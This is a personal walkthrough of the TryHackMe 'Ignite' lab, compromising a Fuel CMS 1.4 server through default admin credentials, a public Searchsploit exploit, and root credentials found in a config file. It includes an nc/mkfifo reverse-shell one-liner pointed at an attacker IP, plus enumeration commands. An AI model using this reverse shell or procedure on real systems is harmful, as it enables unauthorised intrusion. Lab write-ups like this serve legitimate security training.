# TryHackMe — Ignite WriteUp

![[Pasted image 20251001154221.png]]

**Room:** [Ignite](https://tryhackme.com/room/ignite)
**Category:** Web Application Exploitation
**Description:** This room is a CTF to exploit a vulnerable Fuel CMS web application.

---
## Tools
- **Nmap -** service and version discovery
- **Searchsploit -** local exploit database lookup
- **Python 3 -** run exploitation scripts and stabilizing shells
- **netcat (nc) -** listener for reverse shells
- **Custom exploit scripts -** (from Searchsploit results)
---
## Target
IP: `10.201.57.235` (exported as an environment variable for convenience)
```bash
# Set target IP for easier command reuse
export IP=10.201.57.235
```

---
# Phase 1: Enumeration & Recon

To start I performed an Nmap scan to identify open ports and services:
```bash
nmap -sV -sC -sS -T4 $IP
```

![[Pasted image 20250926111202.png]]
### Nmap findings:
- Port **80** open (HTTP).
- HTTP title and headers reveal **Fuel CMS**.
- `Disallow: /fuel/` entry was present in robots.txt

When I visited the site it shows Fuel CMS **Version 1.4** and default admin credentials on the page. **Username: admin / Password: admin**:
![[Pasted image 20250926112213.png]]

![[Pasted image 20250926112513.png]]

---
# Phase 2: Exploitation

I navigated to `/fuel/` and used the default credentials to log in to the admin account:
![[Pasted image 20250926112819.png]]

![[Pasted image 20250926112848.png]]

I attempted to upload a PHP file via the admin UI but received:
> "There was an error uploading your file. Please make sure the server is setup to upload files of this size and folders are writable."

This suggested either upload restrictions or non-writable directories is on this web app.:
![[Pasted image 20250926114833.png]]

### Searching for known vulnerabilities
I used `searchsploit` to find public exploits for Fuel CMS v1.4 and tested multiple results against the webapp:
![[Pasted image 20250926121629.png]]

Tried `47138.py` and it failed with an error:
![[Pasted image 20250926125013.png]]

Then tried 50477.py next and this resulted in shell access.:
![[Pasted image 20250926125359.png]]

With this exploit I was able to get a shell but it mostly returns 'system' with the cd and sudo command. The exploit produced a dummy shell (non-interactive), so the next thing I did was try to create a more interactive shell:
![[Pasted image 20250926131346.png]]

### Stabilizing an interactive shell

I opened another terminal and started a netcat listener:
![[Pasted image 20250926134102.png]]

In the dummy shell I ran this command, one-line reverse shell :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_IP> 4444 > /tmp/f

#replace <attacker_IP> to my IP
```

After establishing a stable shell, I enumerated the filesystem and found the first flag under `/home/www-data`:
![[Pasted image 20250926135037.png]]

---
# Phase 3: Privilege Escalation
Performed standard enumeration:
```bash
hostname
uname -a
whoami
ps aux
env
find / -type f -perm /4000 2>/dev/null
find /etc -type f -readable 2>/dev/null
```

![[Pasted image 20250926141711.png]]
![[Pasted image 20250930111639.png]]

Initial enumeration showed standard users and `/etc/passwd` was readable and I was able to confirm `www-data` and `root` users:
![[Pasted image 20250926141315.png]]

![[Pasted image 20250926142115.png]]

Revisited the site content (previously observed pages/assets) and carefully searched for mentions of passwords.

I revisited the site because I remember observing that there was an assets directory in it. On the home page I found instructions referencing a password location. I searched for "password" and it led me to identify the instructions to access config `fuel/application/config/database.php`, which contained root credentials:
![[Pasted image 20250930114003.png]]

I navigated to the location `fuel/application/config/database.php`. and retrieved credentials to the root user:
![[Pasted image 20250930114046.png]]

The shell needed to update with a proper TTY To get to into root. So I ran this:
```bash
python3 -c 'import pty, os; pty.spawn("/bin/bash")'
```

After getting into root I was able to identify the file `root.txt` and it had the final flag in there: 
![[Pasted image 20250930115328.png]]

# Takeaways
- **Read everything on the target site**. Publicly visible default credentials and page instructions led directly to admin access and critical paths.
- **Security misconfiguration is a primary weakness.** This host exhibited insecure defaults and sensitive information exposure (OWASP: Security Misconfiguration / Sensitive Data Exposure).
- **Utilize shell stability** because the exploit that worked for me gave me access but it had limited functionality. Converting the non-interactive shells using netcat, PTY, TTY spawn was necessary.
- **Trial and error** for version-specific exploits. It is necessary for me to be prepared to try multiple exploits and handle failures.